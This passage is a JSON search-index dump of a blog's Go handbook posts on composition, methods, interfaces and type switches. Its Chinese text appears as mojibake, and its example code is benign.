age&#125;&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹3â€”â€”ç»„åˆ","date":"2023-10-27T01:24:02.203Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/ç»„åˆ/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹3â€”â€”ç»„åˆ/","text":"Go è¯­è¨€è™½ç„¶æŠ›å¼ƒäº†ç»§æ‰¿ï¼Œä½†æ˜¯å´æä¾›äº†ä¸€ä¸ªæ›´åŠ æ–¹ä¾¿çš„ç»„åˆç‰¹æ€§ã€‚ç›¸å¯¹äºç»§æ‰¿çš„ç¼–è¯‘æœŸç¡®å®šå®ç°ï¼Œç»„åˆçš„è¿è¡Œæ€æŒ‡å®šå®ç°ï¼Œæ›´åŠ çµæ´»ã€‚ä¸‹é¢é€šè¿‡ä¸€æ®µä»£ç æ¥äº†è§£ç»„åˆçš„åŸºæœ¬å±æ€§ä»¥åŠå®ƒä¸ç»§æ‰¿çš„ä¸åŒä¹‹å¤„ã€‚ å…ˆå®šä¹‰ä¸€ä¸ªç»“æ„ä½“ Base, å¹¶ä¸ºå®ƒæ·»åŠ ä¸¤ä¸ªæ–¹æ³• Foo() å’Œ Bar()ï¼š 1234567891011121314151617type Base struct&#123; Name string&#125;func (b *Base) Foo() &#123;...&#125;func (b *Base) Bar() &#123;...&#125;type Seed struct &#123; Base ...&#125;func (s *Seed) Foo() &#123; s.Base.Foo() s.Bar() ...&#125; ä¸Šé¢ä»£ç å…ˆå®šä¹‰äº†ä¸€ä¸ª Base ç±»ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ª Seed ç±»ã€‚Seed ç±»â€œç»§æ‰¿â€äº† Base ç±»çš„æ‰€æœ‰æˆå‘˜å±æ€§å’Œæ–¹æ³•å¹¶é‡å†™äº† Foo() æ–¹æ³•ã€‚åŒæ—¶åœ¨é‡å†™ Foo() æ–¹æ³•æ—¶è°ƒç”¨äº† Base ç±»çš„ Foo() æ–¹æ³•å’Œ Bar() æ–¹æ³•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥æ­¤æ—¶ Seed çš„å¯¹è±¡é€šè¿‡ s.Foo() è°ƒç”¨ Foo() æ–¹æ³•æ—¶ï¼Œå®é™…è°ƒç”¨çš„æ˜¯ Seed é‡å†™è¿‡åçš„ Foo() æ–¹æ³•ï¼Œè€Œä¸æ˜¯åŸºç±» Base çš„ Foo() æ–¹æ³•ï¼Œè‹¥æƒ³è°ƒç”¨ Base ç±»çš„ Foo() æ–¹æ³•åˆ™è¦ä½¿ç”¨ s.Base.Fooï¼Œè€Œè°ƒç”¨æ²¡æœ‰é‡å†™çš„ Bar() æ–¹æ³•æ—¶ï¼Œä½¿ç”¨ s.Bar() å’Œs.Base.Bar() æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"ç»„åˆ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/ç»„åˆ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E7%BB%84%E5%90%88/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹2â€”â€”æ–¹æ³•","date":"2023-10-27T01:24:02.200Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ–¹æ³•/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹2â€”â€”æ–¹æ³•/","text":"Demo æ–¹æ³• æ–¹æ³•æ˜¯ä½œç”¨åœ¨è‡ªå®šä¹‰ç±»å‹ä¸Šçš„ä¸€ç±»ç‰¹æ®Šå‡½æ•°ï¼Œé€šå¸¸è‡ªå®šä¹‰ç±»å‹çš„å€¼ä¼šè¢«ä¼ é€’ç»™è¯¥å‡½æ•°ï¼Œè¯¥å€¼å¯èƒ½æ˜¯ä»¥æŒ‡é’ˆæˆ–è€…å¤åˆ¶å€¼çš„å½¢å¼ä¼ é€’ã€‚å®šä¹‰æ–¹æ³•å’Œå®šä¹‰å‡½æ•°å‡ ä¹ç›¸åŒï¼Œåªæ˜¯éœ€è¦åœ¨ func å…³é”®å­—å’Œæ–¹æ³•åä¹‹é—´å¿…é¡»å†™ä¸Šæ¥æ¥å—è€…ã€‚ä¾‹å¦‚æˆ‘ä»¬ç»™ç±»å‹ Count å®šä¹‰äº†ä»¥ä¸‹æ–¹æ³•ï¼š 12345type Count intfunc (count *Count) Increment() &#123; *count++ &#125; // æ¥å—è€…æ˜¯ä¸€ä¸ª `Count` ç±»å‹çš„æŒ‡é’ˆfunc (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125; ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬åœ¨å†…ç½®ç±»å‹ int çš„åŸºç¡€ä¸Šå®šä¹‰äº†è‡ªå®šä¹‰ç±»å‹ Countï¼Œç„¶åç»™è¯¥ç±»å‹æ·»åŠ äº† Increment()ã€Decrement() å’Œ IsZero() æ–¹æ³•ï¼Œå…¶ä¸­å‰ä¸¤è€…çš„æ¥å—è€…ä¸º Count ç±»å‹çš„æŒ‡é’ˆï¼Œåä¸€ä¸ªæ–¹æ³•æ¥æ”¶ Count ç±»å‹çš„å€¼ã€‚ Demo: ç±»å‹çš„æ–¹æ³•é›†æ˜¯æŒ‡å¯ä»¥è¢«è¯¥ç±»å‹çš„å€¼è°ƒç”¨çš„æ‰€æœ‰æ–¹æ³•çš„é›†åˆã€‚ ä¸€ä¸ªæŒ‡å‘è‡ªå®šä¹‰ç±»å‹çš„å€¼çš„æŒ‡é’ˆï¼Œå®ƒçš„æ–¹æ³•é›†ç”±è¯¥ç±»å‹å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ç»„æˆï¼Œæ— è®ºè¿™äº›æ–¹æ³•æ¥å—çš„æ˜¯ä¸€ä¸ªå€¼è¿˜æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚å¦‚æœåœ¨æŒ‡é’ˆä¸Šè°ƒç”¨ä¸€ä¸ªæ¥å—å€¼çš„æ–¹æ³•ï¼ŒGo è¯­è¨€ä¼šèªæ˜åœ°å°†è¯¥æŒ‡é’ˆè§£å¼•ç”¨ã€‚ ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹å€¼çš„æ–¹æ³•é›†åˆåˆ™ç”±è¯¥ç±»å‹å®šä¹‰çš„æ¥æ”¶è€…ä¸ºå€¼ç±»å‹çš„æ–¹æ³•ç»„æˆï¼Œä½†æ˜¯ä¸åŒ…æ‹¬é‚£äº›æ¥æ”¶è€…ç±»å‹ä¸ºæŒ‡é’ˆçš„æ–¹æ³•ã€‚ å…¶å®è¿™äº›é™åˆ¶ Go è¯­è¨€å¸®æˆ‘ä»¬è§£å†³çš„éå¸¸å¥½ï¼Œç»“æœå°±æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨å€¼ç±»å‹ä¸Šè°ƒç”¨æ¥æ”¶è€…ä¸ºæŒ‡é’ˆçš„æ–¹æ³•ã€‚å‡å¦‚æˆ‘ä»¬åªæœ‰ä¸€ä¸ªå€¼ï¼Œä»ç„¶å¯ä»¥è°ƒç”¨ä¸€ä¸ªæ¥æ”¶è€…ä¸ºæŒ‡é’ˆç±»å‹çš„æ–¹æ³•ï¼Œè¿™æ˜¯å› ä¸º Go è¯­è¨€ä¼šè‡ªåŠ¨è·å–å€¼çš„åœ°å€ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œå‰ææ˜¯è¯¥å€¼æ˜¯å¯å¯»å€çš„ã€‚ åœ¨ä»¥ä¸Šå®šä¹‰çš„ç±»å‹ Count ä¸­ï¼Œ*Count æ–¹æ³•é›†æ˜¯ Increment(), Decrement() å’Œ IsZero()ï¼ŒCount çš„å€¼çš„æ–¹æ³•é›†æ˜¯ IsZero()ã€‚ä½†æ˜¯å› ä¸º Count ç±»å‹çš„æ˜¯å¯å¯»å€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Count çš„å€¼è°ƒç”¨å…¨éƒ¨çš„æ–¹æ³•ã€‚ å¦å¤–å¦‚æœç»“æ„ä½“çš„å­—æ®µä¹Ÿæœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ç»“æ„ä½“è®¿é—®å­—æ®µä¸­çš„æ–¹æ³•ã€‚ä¸‹é¢è®©æˆ‘ä»¬ç»ƒä¹ ä¸‹ï¼Œåˆ›å»ºæºæ–‡ä»¶ struct_t.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536package mainimport &quot;fmt&quot;type Count int // åˆ›å»ºè‡ªå®šä¹‰ç±»å‹ Countfunc (count *Count) Increment() &#123; *count++ &#125; // Countç±»å‹çš„æ–¹æ³•func (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125;type Part struct &#123; // åŸºäºç»“æ„ä½“åˆ›å»ºè‡ªå®šä¹‰ç±»å‹ Part stat string Count // åŒ¿åå­—æ®µ&#125;func (part Part) IsZero() bool &#123; // è¦†ç›–äº†åŒ¿åå­—æ®µCountçš„IsZero()æ–¹æ³• return part.Count.IsZero() &amp;&amp; part.stat == &quot;&quot; // è°ƒç”¨äº†åŒ¿åå­—æ®µçš„æ–¹æ³•&#125;func (part Part) String() string &#123; // å®šä¹‰String()æ–¹æ³•ï¼Œè‡ªå®šä¹‰äº†æ ¼å¼åŒ–æŒ‡ä»¤%vçš„è¾“å‡º return fmt.Sprintf(&quot;&lt;&lt;%s, %d&gt;&gt;&quot;, part.stat, part.Count)&#125;func main() &#123; var i Count = -1 fmt.Printf(&quot;Start \\&quot;Count\\&quot; test:\\nOrigin value of count: %d\\n&quot;, i) i.Increment() fmt.Printf(&quot;Value of count after increment: %d\\n&quot;, i) fmt.Printf(&quot;Count is zero t/f? : %t\\n\\n&quot;, i.IsZero()) fmt.Println(&quot;Start: \\&quot;Part\\&quot; test:&quot;) part := Part&#123;&quot;232&quot;, 0&#125; fmt.Printf(&quot;Part: %v\\n&quot;, part) fmt.Printf(&quot;Part is zero t/f? : %t\\n&quot;, part.IsZero()) fmt.Printf(&quot;Count in Part is zero t/f?: %t\\n&quot;, part.Count.IsZero()) // å°½ç®¡è¦†ç›–äº†åŒ¿åå­—æ®µçš„æ–¹æ³•ï¼Œä½†è¿˜æ˜¯å¯ä»¥è®¿é—®&#125; ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº† Count ç±»å‹ï¼Œç„¶ååœ¨å…¶åŸºç¡€ä¸Šåˆåˆ›å»ºäº†ç»“æ„ä½“ç±»å‹ Partã€‚æˆ‘ä»¬ä¸º Count ç±»å‹å®šä¹‰äº† 3 ä¸ªæ–¹æ³•ï¼Œå¹¶åœ¨ Part ç±»å‹ä¸­åˆ›å»ºäº†æ–¹æ³• IsZero() è¦†ç›–äº†å…¶åŒ¿åå­—æ®µ Count ä¸­ IsZero() æ–¹æ³•ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥äºŒæ¬¡è®¿é—®åˆ°åŒ¿åå­—æ®µä¸­è¢«è¦†ç›–çš„æ–¹æ³•ã€‚æ‰§è¡Œä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456789101112$ go run struct_t.goStart &quot;Count&quot; test:Origin value of count: -1Value of count after increment: 0Count is zero t/f? : trueStart: &quot;Part&quot; test:Part: &lt;&lt;232, 0&gt;&gt;Part is zero t/f? : falseCount in Part is zero t/f?: true","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"æ–¹æ³•","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ–¹æ³•","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%96%B9%E6%B3%95/"}]},{"title":"Goé¢å‘å¯¹è±¡ç¼–ç¨‹5â€”â€”æ¥å£å˜é‡å€¼çš„ç±»å‹","date":"2023-10-27T01:24:02.197Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ¥å£å˜é‡å€¼çš„ç±»å‹/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹5â€”â€”æ¥å£å˜é‡å€¼çš„ç±»å‹/","text":"Demo æ¥å£ åœ¨ Go ä¸­ï¼Œæ¥å£æ˜¯ä¸€ç»„æ–¹æ³•ç­¾åã€‚å½“ä¸€ä¸ªç±»å‹ä¸ºæ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•æä¾›å®šä¹‰æ—¶ï¼Œå®ƒè¢«ç§°ä¸ºå®ç°è¯¥æ¥å£ã€‚å®ƒä¸ oop éå¸¸ç›¸ä¼¼ã€‚æ¥å£æŒ‡å®šç±»å‹åº”å…·æœ‰çš„æ–¹æ³•ï¼Œç±»å‹å†³å®šå¦‚ä½•å®ç°è¿™äº›æ–¹æ³•ã€‚ æ¥å£åŸºç¡€ ä¹‹æ‰€ä»¥è¯´ Go è¯­è¨€çš„é¢å‘å¯¹è±¡å¾ˆçµæ´»ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯ç”±äºæ¥å£çš„å­˜åœ¨ã€‚æ¥å£æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹ï¼Œå®ƒå£°æ˜äº†ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–¹æ³•ç­¾åï¼Œä»»ä½•å®ç°äº†è¿™äº›æ–¹æ³•çš„ç±»å‹éƒ½å®ç°è¿™ä¸ªæ¥å£ã€‚infterface&#123;&#125; ç±»å‹æ˜¯å£°æ˜äº†ç©ºæ–¹æ³•é›†çš„æ¥å£ç±»å‹ã€‚ä»»ä½•ä¸€ä¸ªå€¼éƒ½æ»¡è¶³ interface&#123;&#125; ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸€ä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•æ¥æ”¶ interface&#123;&#125; ç±»å‹çš„å‚æ•°ï¼Œé‚£ä¹ˆä»»æ„ç±»å‹çš„å‚æ•°éƒ½å¯ä»¥ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚æ¥å£æ˜¯å®Œå…¨æŠ½è±¡çš„ï¼Œä¸èƒ½å®ä¾‹åŒ–ã€‚æ¥å£èƒ½å­˜å‚¨ä»»ä½•å®ç°äº†è¯¥æ¥å£çš„ç±»å‹ã€‚ç›´æ¥çœ‹ä¾‹å­å§ï¼Œåˆ›å»ºæºæ–‡ä»¶ interface_t.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport &quot;fmt&quot;type Human struct &#123; // ç»“æ„ä½“ name string age int phone string&#125;//Humanå®ç°SayHiæ–¹æ³•func (h Human) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s you can call me on %s\\n&quot;, h.name, h.phone)&#125;//Humanå®ç°Singæ–¹æ³•func (h Human) Sing(lyrics string) &#123; fmt.Println(&quot;La la la la...&quot;, lyrics)&#125;type Student struct &#123; Human //åŒ¿åå­—æ®µ school string loan float32&#125;type Employee struct &#123; Human //åŒ¿åå­—æ®µ company string money float32&#125;// Employeeé‡è½½Humançš„SayHiæ–¹æ³•func (e Employee) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s, I work at %s. Call me on %s\\n&quot;, e.name, e.company, e.phone)&#125;// Interface Menè¢«Human,Studentå’ŒEmployeeå®ç°// å› ä¸ºè¿™ä¸‰ä¸ªç±»å‹éƒ½å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•type Men interface &#123; SayHi() Sing(lyrics string)&#125;func main() &#123; mike := Student&#123;Human&#123;&quot;Mike&quot;, 25, &quot;222-222-XXX&quot;&#125;, &quot;MIT&quot;, 0.00&#125; paul := Student&#123;Human&#123;&quot;Paul&quot;, 26, &quot;111-222-XXX&quot;&#125;, &quot;Harvard&quot;, 100&#125; sam := Employee&#123;Human&#123;&quot;Sam&quot;, 36, &quot;444-222-XXX&quot;&#125;, &quot;Golang Inc.&quot;, 1000&#125; Tom := Employee&#123;Human&#123;&quot;Tom&quot;, 37, &quot;222-444-XXX&quot;&#125;, &quot;Things Ltd.&quot;, 5000&#125; //å®šä¹‰Menç±»å‹çš„å˜é‡i var i Men //ièƒ½å­˜å‚¨Student i = mike fmt.Println(&quot;This is Mike, a Student:&quot;) i.SayHi() i.Sing(&quot;November rain&quot;) //iä¹Ÿèƒ½å­˜å‚¨Employee i = Tom fmt.Println(&quot;This is Tom, an Employee:&quot;) i.SayHi() i.Sing(&quot;Born to be wild&quot;) //å®šä¹‰äº†slice Men fmt.Println(&quot;Let&#x27;s use a slice of Men and see what happens&quot;) x := make([]Men, 3) //è¿™ä¸‰ä¸ªéƒ½æ˜¯ä¸åŒç±»å‹çš„å…ƒç´ ï¼Œä½†æ˜¯ä»–ä»¬å®ç°äº†interfaceåŒä¸€ä¸ªæ¥å£ x[0], x[1], x[2] = paul, sam, mike for _, value := range x &#123; value.SayHi() &#125;&#125; æ¥å£å˜é‡å€¼çš„ç±»å‹* æ¥å£ç±»å‹å£°æ˜çš„å˜é‡é‡Œèƒ½å­˜å‚¨ä»»ä½•å®ç°äº†è¯¥æ¥å£çš„ç±»å‹çš„å€¼ã€‚ æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªå˜é‡é‡Œçš„å€¼çš„ç±»å‹ï¼Œé‚£ä¹ˆéœ€è¦æ€ä¹ˆåšå‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨ç±»å‹æ–­è¨€ï¼Œæˆ–è€…æ˜¯ switch ç±»å‹åˆ¤æ–­åˆ†æ”¯ã€‚ä»¥ä¸‹çš„ä¾‹å­ interface_t1.go æˆ‘ä»¬ä½¿ç”¨äº† switch ç±»å‹åˆ¤æ–­åˆ†æ”¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142/*ä½¿ç”¨äº†switch ç±»å‹åˆ¤æ–­åˆ†æ”¯*/package mainimport ( &quot;fmt&quot; &quot;strconv&quot;)type Element interface&#123;&#125;type List []Elementtype Person struct &#123; name string age int&#125;// å®ç°äº†fmt.Stringeræ¥å£func (p Person) String() string &#123; return &quot;(name: &quot; + p.name + &quot;- age: &quot; + strconv.Itoa(p.age) + &quot; years)&quot;&#125;func main() &#123; list := make(List, 4) list[0] = 1 list[1] = &quot;Hello&quot; list[2] = Person&#123;&quot;Dennis&quot;, 70&#125; list[3] = 1 + 2i for index, element := range list &#123; switch value := element.(type) &#123; case int: fmt.Printf(&quot;list[%d] is an int and its value is %d\\n&quot;, index, value) case string: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) case Person: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) default: fmt.Printf(&quot;list[%d] is of a different type&quot;, index) &#125; &#125;&#125; åµŒå…¥interface ç»“æ„ä½“ä¸­å¯ä»¥åµŒå…¥åŒ¿åå­—æ®µï¼Œå…¶å®åœ¨æ¥å£é‡Œä¹Ÿå¯ä»¥å†åµŒå…¥æ¥å£ã€‚å¦‚æœä¸€ä¸ª interface1 ä½œä¸º interface2 çš„ä¸€ä¸ªåµŒå…¥å­—æ®µï¼Œé‚£ä¹ˆ interface2 éšå¼çš„åŒ…å«äº† interface1 é‡Œçš„æ–¹æ³•ã€‚å¦‚ä¸‹ä¾‹å­ä¸­ï¼ŒInterface2 åŒ…å«äº† Interface1 çš„æ‰€æœ‰æ–¹æ³•ã€‚ 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go ç®€æ˜æ‰‹å†Œ","slug":"Go-ç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go-%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"æ¥å£å˜é‡å€¼çš„ç±»å‹","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ¥å£å˜é‡å€¼çš„ç±»å‹","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3%E5%8F%98%E9%87%8F%E5%80%BC%E7%9A%84%E7%B1%BB%E5%9E%8B/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹4â€”â€”æ¥å£","date":"2023-10-27T01:24:02.195Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/æ¥å£/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹4â€”â€”æ¥å£/","text":"Demo æ¥å£ åœ¨ Go ä¸­ï¼Œæ¥å£æ˜¯ä¸€ç»„æ–¹æ³•ç­¾åã€‚å½“ä¸€ä¸ªç±»å‹ä¸ºæ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•æä¾›å®šä¹‰æ—¶ï¼Œå®ƒè¢«ç§°ä¸ºå®ç°è¯¥æ¥å£ã€‚å®ƒä¸ oop éå¸¸ç›¸ä¼¼ã€‚æ¥å£æŒ‡å®šç±»å‹åº”å…·æœ‰çš„æ–¹æ³•ï¼Œç±»å‹å†³å®šå¦‚ä½•å®ç°è¿™äº›æ–¹æ³•ã€‚ æ¥å£åŸºç¡€ ä¹‹æ‰€ä»¥è¯´ Go è¯­è¨€çš„é¢å‘å¯¹è±¡å¾ˆçµæ´»ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯ç”±äºæ¥å£çš„å­˜åœ¨ã€‚æ¥å£æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹ï¼Œå®ƒå£°æ˜äº†ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–¹æ³•ç­¾åï¼Œä»»ä½•å®ç°äº†è¿™äº›æ–¹æ³•çš„ç±»å‹éƒ½å®ç°è¿™ä¸ªæ¥å£ã€‚infterface&#123;&#125; ç±»å‹æ˜¯å£°æ˜äº†ç©ºæ–¹æ³•é›†çš„æ¥å£ç±»å‹ã€‚ä»»ä½•ä¸€ä¸ªå€¼éƒ½æ»¡è¶³ interface&#123;&#125; ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸€ä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•æ¥æ”¶ interface&#123;&#125; ç±»å‹çš„å‚æ•°ï¼Œé‚£ä¹ˆä»»æ„ç±»å‹çš„å‚æ•°éƒ½å¯ä»¥ä¼ 